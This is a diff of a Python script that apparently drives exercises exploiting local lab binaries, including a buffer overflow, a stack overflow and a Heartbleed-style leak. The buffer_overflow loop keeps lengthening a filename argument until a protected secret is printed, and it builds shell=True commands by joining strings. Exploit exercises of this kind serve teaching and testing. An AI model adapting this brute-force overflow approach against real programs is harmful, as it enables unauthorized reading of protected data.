@@ -25,12 +25,13 @@ def stack_overflow():
 def buffer_overflow():
 
     stdout = []
-    filename = "wsecret.txt"
+    filename = "h.txt"
+    name = "wsecret.txt"
     counter = 1
     while ("You should not be able to read" not in stdout):
         
-        proc = Popen(["./buffer_overflow " + filename], shell = True,stdin=PIPE,stdout=PIPE,stderr=PIPE)
-        filename = "w" + filename
+        proc = Popen(["./buffer_overflow " + filename + " " + name], shell = True,stdin=PIPE,stdout=PIPE,stderr=PIPE)
+        name = "w" + name
         stdout,stderr = proc.communicate()  
         print(stdout)  
         print(stderr)
@@ -54,12 +55,7 @@ def heart_bleed():
 
     print("Final message is {}".format(stdout.replace("\n", "")))
 
-<<<<<<< HEAD:hack2.py
-stack_overflow()    
-#buffer_overflow()
-#heart_bleed()
-=======
+
 #stack_overflow()    
-#buffer_overflow()
-heart_bleed()
->>>>>>> origin/master:h2.py
+buffer_overflow()
+#heart_bleed()
